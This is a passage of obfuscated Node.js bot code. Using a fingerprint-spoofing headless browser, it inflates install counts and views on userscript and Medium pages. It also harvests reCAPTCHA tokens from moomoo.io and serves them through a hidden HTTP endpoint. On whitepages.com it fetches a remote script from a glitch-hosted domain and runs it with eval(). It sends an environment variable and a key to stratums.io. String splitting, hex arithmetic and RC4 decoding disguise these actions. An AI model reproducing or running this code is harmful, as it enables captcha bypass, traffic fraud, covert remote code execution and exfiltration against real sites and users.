      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + S(0xb) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + U(0x12, 'uowq') + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + S(0xe) + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + U(0xa, 'lLh%'),
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xfa7 * 0x2 + -0x1 * -0x1f51 + -0x1 * 0x3
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1 * 0x419 + -0x1b57 + 0x15e * 0x11)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x711 + -0x4e1 + 0xc56), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x5a2 + -0x2584 + 0x66 * 0x51), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x38b * -0x9 + 0x1d * -0x12 + -0x1dd9;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x672 + 0xb99 + -0x527; w < getRandomInt(-0x677 * 0x1 + -0x2 * -0x11b6 + -0x1cf4, -0xcb6 + -0x19b1 + -0x2 * -0x1336); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xc3f7 * -0x1 + -0x11990 + 0x1241 * 0x27);
        }
      }();
    }, -0xad2 + 0x4f * -0x64 + 0x2a12), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const V = c;
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + V(0x4)],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1 * -0xba1 + -0x2d5 + 0xe76;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x18d * 0x17 + -0x1ca4 + -0x404f * -0x1, 0x260d + 0x764 + -0x2d3f)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x3215 + 0xa3 * 0x137 + -0x82ea);
    }, -0xe4e * -0x1 + 0x961 * -0x2 + 0x4d8), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0xb83 + -0x24a2 + 0x3b * 0x6d;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x5 * 0x5bf + 0x1 * 0x1002 + 0x1871), await u['evaluate'](() => {
            const W = b;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + W(0x0, 'EYa1') + '7/wp.js', 0x10b0 + -0x1 * 0x1060 + -0x50), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x10b4f8 + -0x27e27 + 0x3d * -0x205);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x332 * -0x8 + 0x3b4 * 0x1 + 0x590 * 0x4);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x4 * 0x827 + 0x1bc + 0x1fa8);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x14 * -0x248 + -0x39fd * -0x1 + 0x1333);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x822 * -0x4 + -0x2 * 0xf6d + -0x5 * 0x56);
    let h = e[f];
    if (b['DrWJjm'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1df1 + -0x48a * -0x4 + 0xbc9, s, t, u = 0x92 * -0x29 + -0x1 * 0x2201 + -0xf9 * -0x3b; t = n['charAt'](u++); ~t && (s = r % (-0x2065 + -0x94 * 0x24 + -0x5 * -0xaa5) ? s * (-0x44d + -0x2604 * -0x1 + -0x293 * 0xd) + t : t, r++ % (0xd6d + -0xa45 * 0x1 + -0x324)) ? p += String['fromCharCode'](-0x287 * 0x2 + 0xccc + -0x6bf & s >> (-(0x95b + 0x78d * -0x1 + -0x1cc) * r & -0x1 * 0x82 + 0x1b * -0x171 + 0x2773)) : 0x13c4 + -0xdf1 * -0x2 + -0x2 * 0x17d3) {
          t = o['indexOf'](t);
        }
        for (let v = -0x360 * 0x3 + 0x5bd * -0x1 + 0xfdd, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x16fd + 0x2 * -0x754 + -0x563 * -0x7))['slice'](-(0x1732 + 0x26bf + 0x3 * -0x14a5));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1f2e + 0xd2a + 0x4 * 0x481,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1f24 * 0x1 + -0x11a * -0xf + 0xe9e; u < -0x1457 * -0x1 + 0xf56 + 0x3 * -0xb8f; u++) {
          p[u] = u;
        }
        for (u = 0xd6d * 0x1 + 0x85 * 0x35 + 0x28f6 * -0x1; u < -0x42d * 0x3 + 0x35 * 0x13 + 0x998; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xfdd * -0x1 + -0x17b1 + 0x1 * 0x8d4), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0xee3 + 0xb7 * 0x1d + -0x239e, q = -0x14dd + -0x1 * 0x16a1 + 0x2b7e * 0x1;
        for (let v = -0x676 * 0x1 + -0x3 * 0xc5b + 0xb * 0x3f5; v < n['length']; v++) {
          u = (u + (-0xf66 + 0x2b2 + -0xcb5 * -0x1)) % (0xba3 + -0x4e4 + -0x5bf), q = (q + p[u]) % (-0xb1 * -0x19 + -0x124 * -0x1c + -0x3039), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2166 + -0x1d48 + -0x39 * 0xe)]);
        }
        return t;
      };
      b['JwuLxA'] = m, c = arguments, b['DrWJjm'] = !![];
    }
    const j = e[0x5b1 + 0x1ee0 + -0x2491],
      k = f + j,
      l = c[k];
    return !l ? (b['URSKQu'] === undefined && (b['URSKQu'] = !![]), h = b['JwuLxA'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const X = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x289 * -0xb + 0xd10 * -0x1 + -0xed2) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x24b5 + 0x179c + -0x3c50));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1483 + 0x1598 + -0x2a1b, D['indexOf']('\x20'));
        return B ? E['slice'](0xb0c + -0x17a6 + 0xc9a, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xe7d + 0xea9 + 0x3 * 0x34e),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x617 * 0x7 + 0x2393 + 0x2e1e),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + X(0x14, 'KAl8') + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x7 * -0x4cd + -0x2509 + 0x36e; k < -0x4 * 0x85f + 0x15f3 + 0xb8d; k++)
    setTimeout(f, (-0x16e83 + -0xdf * 0x1eb + 0x40498) * k * getRandomInt(-0xbc * -0x2c + 0x323 * -0x7 + -0x19 * 0x6a, -0xa21 + 0x1 * -0x1bd1 + -0xed * -0x29));
  setInterval(() => {
    f();
    for (let l = -0xb9 * 0x7 + 0x1ac8 + -0x15b9 * 0x1; l < -0x105c + 0x1fe3 * 0x1 + -0xf83; l++)
      setTimeout(f, (-0x1a8f * 0x4 + 0x19ef4 + -0x4a58) * l * getRandomInt(0x1 * -0xf0b + 0x29f * 0x6 + 0x6 * -0x1d, 0x1c22 + 0x501 * -0x3 + -0xd1c));
  }, -0x389b29 + -0xfcea8 + 0x7f5851);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
